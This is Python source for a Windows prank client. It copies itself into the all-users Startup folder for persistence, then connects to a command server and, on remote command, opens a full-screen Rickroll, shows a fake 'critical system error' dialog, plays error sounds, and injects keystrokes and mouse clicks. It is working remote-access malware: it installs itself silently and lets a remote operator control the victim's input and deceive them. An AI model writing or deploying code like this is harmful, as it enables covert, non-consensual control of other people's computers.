import socket
import time
import ctypes
import shutil
import os
import sys
import webbrowser

user32 = ctypes.windll.user32

# Récupérer le fichier courant (.py ou .exe)
fichier_source = getattr(sys, 'frozen', False) and sys.executable or os.path.abspath(__file__)

# Dossier de destination
dossier_destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
os.makedirs(dossier_destination, exist_ok=True)

# Nom de base pour la copie
nom_base, extension = os.path.splitext(os.path.basename(fichier_source))
fichier_copie = os.path.join(dossier_destination, f"{nom_base}_copy{extension}")

# Vérifier si le fichier existe déjà et trouver un nom libre
compteur = 1
while os.path.exists(fichier_copie):
    fichier_copie = os.path.join(dossier_destination, f"{nom_base}_copy{compteur}{extension}")
    compteur += 1

# Copier le fichier
shutil.copy2(fichier_source, fichier_copie)

print(f"Le fichier a été copié dans {fichier_copie}")

# =============================
# 🎵 Rickroll plein écran
# =============================
def play_rickroll_fullscreen():
    url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1"

    webbrowser.open(url)
    time.sleep(4)

    # Focus navigateur (clic centre écran)
    screen_x = user32.GetSystemMetrics(0)
    screen_y = user32.GetSystemMetrics(1)
    user32.SetCursorPos(screen_x // 2, screen_y // 2)
    mouse_left_click()
    time.sleep(1)

    # 'f' = plein écran YouTube
    press_key("f")

    time.sleep(10)

    # Fermer onglet (Alt+F4)
    user32.keybd_event(0x12, 0, 0, 0)
    user32.keybd_event(0x73, 0, 0, 0)
    user32.keybd_event(0x73, 0, 2, 0)
    user32.keybd_event(0x12, 0, 2, 0)


# =============================
# 🔊 Son d'erreur Windows
# =============================
def sound_error():
    user32.MessageBeep(0x10)


# =============================
# ❌ Fake erreur Windows
# =============================
def fake_error():
    user32.MessageBeep(0x10)
    user32.MessageBoxW(
        0,
        "A critical system error has occurred.\n\n"
        "Error code: 0x80070057\n\n"
        "The system will attempt recovery.",
        "Windows Error",
        0x10
    )


# =============================
# ⌨️ Clavier
# =============================
VK_KEYS = {
    "enter": 0x0D,
    "esc": 0x1B,
    "space": 0x20,
    "tab": 0x09,
}

def press_key(key):
    key = key.lower()

    if key in VK_KEYS:
        vk = VK_KEYS[key]
    elif len(key) == 1:
        vk = ord(key.upper())
    else:
        return False

    user32.keybd_event(vk, 0, 0, 0)
    user32.keybd_event(vk, 0, 2, 0)
    return True


# =============================
# 🖱️ Souris
# =============================
def mouse_left_click():
    user32.mouse_event(0x0002, 0, 0, 0, 0)
    user32.mouse_event(0x0004, 0, 0, 0, 0)

def mouse_right_click():
    user32.mouse_event(0x0008, 0, 0, 0, 0)
    user32.mouse_event(0x0010, 0, 0, 0, 0)


# =============================
# 📜 Help
# =============================
def help_troll():
    return (
        "Commandes disponibles :\n"
        "- help-troll\n"
        "- rickroll\n"
        "- sound error\n"
        "- fake-error\n"
        "- keyboard <key>\n"
        "- mouse left\n"
        "- mouse right\n"
        "- close"
    )


# =============================
# 🌐 Connexion serveur
# =============================
while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("127.0.0.1", 12345))
        break
    except:
        time.sleep(1)

client_socket.send("Client connecté.".encode())


# =============================
# 🔁 Boucle principale
# =============================
while True:
    command = client_socket.recv(1024).decode()
    if not command:
        break

    print("Commande reçue :", command)

    if command == "help-troll":
        client_socket.send(help_troll().encode())

    elif command == "rickroll":
        play_rickroll_fullscreen()
        client_socket.send("Rickroll exécuté.".encode())

    elif command == "sound error":
        sound_error()
        client_socket.send("Son d'erreur joué.".encode())

    elif command == "fake-error":
        fake_error()
        client_socket.send("Fake error affichée.".encode())

    elif command.startswith("keyboard "):
        key = command.split(" ", 1)[1]
        if press_key(key):
            client_socket.send(f"Touche '{key}' pressée.".encode())
        else:
            client_socket.send("Touche invalide.".encode())

    elif command == "mouse left":
        mouse_left_click()
        client_socket.send("Clic gauche effectué.".encode())

    elif command == "mouse right":
        mouse_right_click()
        client_socket.send("Clic droit effectué.".encode())

    elif command == "close":
        client_socket.send("Client fermé.".encode())
        client_socket.close()
        break

    else:
        client_socket.send("Commande inconnue.".encode())
